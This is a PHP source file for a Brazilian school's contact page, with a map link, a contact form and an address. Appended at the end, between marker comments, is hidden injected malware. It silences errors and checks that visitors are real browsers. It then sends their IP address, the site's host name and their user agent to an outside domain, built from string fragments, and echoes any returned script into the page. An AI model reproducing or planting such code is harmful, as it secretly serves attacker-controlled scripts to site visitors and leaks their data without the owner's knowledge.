<?php include("header.php");

ini_set('display_errors', 'On');
error_reporting(E_ALL | E_STRICT);

 ?>
<body>
<?php include("topo-e-banner.php"); ?>
<div id="content" class="contato">
	<p style="font-weight:bold; font-size:17pt;">Confira <span class="orange">nossa localização</span> abaixo, ou <span class="orange">clique</span> no <span class="orange">mapa</span> e navegue pelo google maps.<br />
	<span class="blue">Esperamos por você!</span><br /><br />
	<a target="_blank" href="http://maps.google.com/maps?q=Beit+School+Campinas&hl=en&ll=-22.885902,-47.052555&spn=0.047445,0.077162&sll=37.0625,-95.677068&sspn=41.632176,79.013672&z=14&iwloc=A"><img src="img/mapa.jpg" alt="Mapa" /></a></p>
	
	<?php 
		if (isset($_GET['m']))
			$mensagem = $_GET['m'];
		
		if($mensagem == 1){
			echo  "<h1 class='title2' style='border-bottom:1px dotted #D5D5D5; padding-bottom:10px; margin-bottom:10px;'>Mensagem enviada com sucesso!</h1>" ;
		}
	?>
	
	<form id="contato" action="envia_contato.php" >
		<div id="form-left">
			<label>Nome</label>
			<input type="text" style="margin-bottom:-10px;" name="nome" /><br /><br />
			<label>E-mail</label>
			<input type="text" style="margin-bottom:-10px;" name="email" /><br /><br />
			<label>Telefone</label>
			<input type="text" name="telefone" /><br /><br />
			<label>Mensagem</label>
			<textarea name="mensagem" cols="30" rows="10"></textarea><br />
			<input type="submit" class="bt-enviar" value="" style="float:right" />
		</div>
	</form>
	<div class="fone">
		<img src="img/fone.png" alt="" style="float:left; margin-right:20px;" />
		<span class="orange">(19) 3252-7458</span><br /><br />
		<a href="mailto:contato@beitschool.com">contato@beitschool.com</a><br /><br />
		Avenida Orosimbo Maia, 2063
		Cambuí - Campinas/SP
	</div>
</div>
<?php include("rodape.php"); ?>
<?php
#74c87f#
error_reporting(0); @ini_set('display_errors',0); $wp_bww5934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_bww5934) && !preg_match ('/bot/i', $wp_bww5934))){
$wp_bww095934="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bww5934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bww095934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_5934bww = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_5934bww = @file_get_contents($wp_bww095934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_5934bww=@stream_get_contents(@fopen($wp_bww095934, "r"));}}
if (substr($wp_5934bww,1,3) === 'scr'){ echo $wp_5934bww; }
#/74c87f#
?>
